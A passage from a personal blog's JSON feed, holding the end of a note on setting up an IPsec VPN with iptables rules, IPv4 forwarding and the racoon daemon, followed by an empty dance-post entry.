IPv4 forward\n\n1\n2\n3\n4\n5# iptables -A INPUT -p udp --dport 500 -j ACCEPT\n# iptables -A INPUT -p udp --dport 4500 -j ACCEPT\n# iptables -t nat -A POSTROUTING -s 10.1.1.0/24 -o eth0 -j MASQUERADE\n# iptables -A FORWARD -s 10.1.1.0/24 -j ACCEPT\n# iptables-save\n\n\n1\n2\n3\n4# /etc/sysctl.conf\n\t\nnet.ipv4.ip_forward = 1\nsysctl -p\n\n\n最后启动 &gt;&lt;\n\n1\n2# service racoon start\n# chkconfig racoon on\n\n\n","excerpt":"咳咳。部署团委的创青春网站(Under Construction 2333)，顺便弄了一下 Cisco 的 VPN。\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"Over The Time Dance","permalink":"http://blog.cee.moe/over-the-time-dance.html","link":"http://blog.cee.moe/over-the-time-dance.html","date":"2013-12-12T00:00:00-08:00","modified":"2016-02-06T06:34:47-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n","excerpt":"\n","languages":null,"categories":["dance"],"tags":[]}]